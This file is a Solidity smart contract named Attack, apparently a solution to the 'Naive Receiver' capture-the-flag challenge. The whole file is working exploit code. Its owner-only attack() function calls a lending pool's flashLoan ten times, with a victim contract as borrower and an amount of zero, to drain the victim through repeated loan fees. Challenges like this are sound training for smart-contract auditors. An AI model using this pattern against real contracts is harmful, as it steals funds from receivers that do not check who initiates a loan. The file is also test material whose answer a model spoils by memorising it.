// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface INaiveReceiverLenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract Attack {
    address public owner;
    address public pool;
    address public victim;

    constructor(address _pool, address _victim) {
        owner = msg.sender;
        pool = _pool;
        victim = _victim;
    }

    function attack() external {
        require(msg.sender == owner);

        INaiveReceiverLenderPool(pool).flashLoan(victim, 0);
        INaiveReceiverLenderPool(pool).flashLoan(victim, 0);
        INaiveReceiverLenderPool(pool).flashLoan(victim, 0);
        INaiveReceiverLenderPool(pool).flashLoan(victim, 0);
        INaiveReceiverLenderPool(pool).flashLoan(victim, 0);
        INaiveReceiverLenderPool(pool).flashLoan(victim, 0);
        INaiveReceiverLenderPool(pool).flashLoan(victim, 0);
        INaiveReceiverLenderPool(pool).flashLoan(victim, 0);
        INaiveReceiverLenderPool(pool).flashLoan(victim, 0);
        INaiveReceiverLenderPool(pool).flashLoan(victim, 0);
    }
}
